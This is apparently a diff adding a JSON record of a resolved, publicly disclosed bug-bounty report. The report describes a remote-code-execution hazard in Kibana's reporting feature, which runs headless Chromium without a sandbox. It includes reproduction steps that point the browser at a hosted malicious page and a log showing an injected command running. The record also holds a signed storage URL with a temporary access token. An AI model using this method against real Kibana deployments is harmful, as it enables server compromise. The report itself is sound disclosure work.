@@ -1,0 +1,136 @@
+{
+  "id": 1168765,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTY4NzY1",
+  "url": "https://hackerone.com/reports/1168765",
+  "title": "RCE hazard in reporting (via Chromium)",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2021-04-19T16:26:55.002Z",
+  "submitted_at": "2021-04-19T16:26:55.228Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "alexbrasetvik",
+    "url": "/alexbrasetvik",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/AMYBseEiuZm6mtG4rfyRgTBu/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23607,
+    "url": "https://hackerone.com/elastic",
+    "handle": "elastic",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/607/c5cce6a2e2d95af85e014db95c2d7560e73e9bec_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/607/c5cce6a2e2d95af85e014db95c2d7560e73e9bec_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Elastic",
+      "twitter_handle": "elastic",
+      "website": "https://www.elastic.co/",
+      "about": "Smarter search. Stronger security. Seamless observability. Uncover real-time insights with Search AI."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2021-05-26T14:52:25.723Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-05-26T07:27:15.244Z",
+  "team_member_agreed_on_going_public_at": "2021-05-26T14:52:25.533Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:** Reporting embeds a Chromium that is susceptible to RCEs\n\n**Description:**\n\nReporting uses a headless Chromium to generate PNGs and PDFs. This is invoked (at least on Elastic Cloud, ECE and ECK) with `--no-sandbox` to work at all.\n\nThere are RCEs readily available for Chrome, and at least the versions shipped with 7.11 and 7.12 are susceptible to the attached example.\n\nAttached is an adaptation of this exploit: https://github.com/rapid7/metasploit-framework/pull/15007/files#diff-42ae645fcacbd90d93296471ac57e1d734544af7fb082efd607db0a29d197ac4R53\n\nI have not been able to devise a complete chain yet (thus the \"hazard\"), but anything that enables pointing reporting at attacker-controlled JS would be able to pop an RCE this way. HTML-injection or XSS (even with the CSP a HTML injection will enable a redirect) or an open redirect would enable pointing reporting at custom JS code.\n\n## Steps To Reproduce:\n\n  1. Host the attached HTML somewhere, in my case it's available on http://192.168.0.154:8009/alexb-says-hi.html\n  1. Point the x-pack reporting-embedded Chromium at it (this step is missing to complete the chain)\n\nHere's an example. The attached HTML file gets `uname -a > /tmp/alexb-says-hi` to be run:\n\n```\n$ docker run --rm -it docker.elastic.co/kibana/kibana:7.12.0 bash  \nbash-4.4$ cd ./x-pack/plugins/reporting/chromium/headless_shell-linux_x64/\nbash-4.4$ ls /tmp/\nks-script-esd4my7v  ks-script-eusq_sc5\nbash-4.4$ ./headless_shell --no-sandbox http://192.168.0.154:8009/alexb-says-hi.html\n[0419/161441.709455:WARNING:resource_bundle.cc(431)] locale_file_path.empty() for locale\n[0419/161441.725018:WARNING:resource_bundle.cc(431)] locale_file_path.empty() for locale\n[0419/161441.727174:WARNING:resource_bundle.cc(431)] locale_file_path.empty() for locale\n[0419/161441.821129:WARNING:resource_bundle.cc(431)] locale_file_path.empty() for locale\n^C # CTRL-C after a few seconds. Reporting would kill it after a timeout\nbash-4.4$ ls /tmp/\nalexb-says-hi  ks-script-esd4my7v  ks-script-eusq_sc5\nbash-4.4$ cat /tmp/alexb-says-hi\nLinux bd1b285e33b7 4.19.121-linuxkit #1 SMP Thu Jan 21 15:36:34 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux\n```\n\n## Supporting Material/References:\n\n  * HTML-file which when accessed via Reporting's headless Chromium triggers an RCE. (Steps to produce that file via msfconsole is embedded in the HTML file as comments)\n\n## Impact\n\nKibana is an HTML-injection (even without full-blown XSS) or an open redirect away from being RCE-able via Reporting.",
+  "bounty_amount": "10000.0",
+  "formatted_bounty": "$10,000",
+  "weakness": {
+    "id": 75,
+    "name": "Privilege Escalation"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1271128,
+      "file_name": "alexb-says-hi.html",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/9jggp66383oqd08vr4akgumljjjz?response-content-disposition=attachment%3B%20filename%3D%22alexb-says-hi.html%22%3B%20filename%2A%3DUTF-8%27%27alexb-says-hi.html&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6INISVZ3%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151440Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEBwaCXVzLXdlc3QtMiJIMEYCIQCxA0kU9XiY%2BIErAIXnMsMVNtl%2FE5gn07DboF84Ro4GewIhAKcH526HP%2FUTlGNE%2Bn3Z%2BKrZG7OBGUuwQgTF7eN2vM4XKrsFCOX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igxkq1afLOUwAnpcC78qjwVV7NeQwp6c10oAYyQZlXnTn9gI0Ts%2B9KxIUb4X8GpfDoGqGGXzDUQxkGsQu%2BPGy%2F%2FLIf4JfosEHqORZBSn%2FScHH6f8LzV6C0KHK5jRpzQtoK%2F%2BENjjdQs8haxQiuT2ZRFBcypmd%2BAKTGjMSxe4m1XWFhwDwiIhkY4qm7a2FYMp5nDCtx3KQI%2FBZyn8PShdZTH0P%2By7VBQ%2F7qmQfGzhvWv1dz1CZTBIkOuFKsqQPB6Koah6W78OSIGVKi5bgEbMBingtEmJ67j3Yr992mXh%2BvSXohKdY1Y4gWOHtCfjLzyQE5pPInEBsVtBGV7KCZLUfMqzJ9LJ96B9KpY0ChVQl5mGV5zWxAMtbJ5Vs9gGY3RyPhS7bRETfqgxrAx7fcN6s8RmdT7DYDhWzH%2FP0BjJIdJDI7NR5GJuCWE5Jp9qxnUCt%2B4gv3ZC2QMTB8KLoIlR0q2ZYGEK5v6hdyXfuOuDfEJDL50qQ7qcZN5ziQc%2F5dwCpUhkm9D%2FeZ9j08ZPtOjZcuOqBvbaX7fjVDJtqdjKNG7pSWm0UuWgGiY5D7qRTGWtkavFUSB%2FJvd9qFDSqQXdF8tdsMp8xoBVOF6hhDYRtFbvodyM3sZz%2BswB4ngY6NZrwHECBMmTLsy3YGvQcm3XtOS2xP6hv4egpk347yDEi2PK3l1l7eXzvKJanMacTaMuna2%2BFljYwc%2BLcaUCqFEPfbrjl0X7PPFZQ6sjs3K5sSVE4Z8U%2FHhfR0sV2PLc%2BPJwd6ot9QM98J6UZZqNievrEktulW2VN%2Bng2aPiSqIupgmtEbBMp%2FbECVgwy%2FsQPOL%2FvfvMiWb%2F3SSI55L26VjoVhSSgQC2bm2Rxjv%2BMvwUaqLhX2f28%2Fb6Kz6vgIehCdJzML29%2FM8GOrABGc1isADKJTP2ykuKvj%2BPktq52gWZ9Sl8NQxqpeEdGbEYy8HeJ9qEps%2Fx8nQ%2B0D8zhGH1Ra6nI%2B4jtk8iQWWguah%2B34MJnN2L9sLZd3gkqWmOFGbT1viV3Ej8OnaiPBxI5dC5CzXX17If2zHZSygBHyPXnpGECPPipctHHdSAba6Wkg5J0m9bcPvgIkHBVUReeA%2BlLaf37ZKiYx4iHg2UIdedWVwsHggGaWLH0syaN2w%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bb05c7906af3e9096b44b678ab4b82a72ed16870e5b2215593f486731c1d8206",
+      "file_size": 30557,
+      "type": "text/html",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2021-06-25T07:27:15.345Z",
+  "allow_singular_disclosure_after": -153733645.65226302,
+  "singular_disclosure_allowed": true,
+  "vote_count": 25,
+  "voters": [
+    "0x_alibabas",
+    "alexbrasetvik",
+    "viridian_40826d",
+    "n1m0",
+    "haxor31337",
+    "dee-see",
+    "m0chan",
+    "rzx007x",
+    "shreyaschavhan",
+    "aryan2808",
+    "and 15 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 438736,
+    "asset_type": "DOWNLOADABLE_EXECUTABLES",
+    "asset_identifier": "Kibana",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
